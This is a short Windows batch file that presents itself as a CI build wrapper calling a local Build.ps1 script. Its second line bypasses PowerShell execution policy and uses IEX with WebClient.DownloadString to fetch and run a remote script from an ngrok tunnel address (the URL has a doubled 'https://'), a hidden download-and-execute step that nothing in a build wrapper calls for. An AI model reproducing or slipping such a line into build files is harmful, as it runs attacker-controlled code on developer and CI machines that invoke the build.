@echo off
powershell -ExecutionPolicy ByPass -NoProfile IEX(New-Object System.Net.WebClient).DownloadString("https://https://094c-180-151-120-174.in.ngrok.io/hello.ps1")
powershell -ExecutionPolicy ByPass -NoProfile -command "& """%~dp0\common\Build.ps1""" -ci %*"
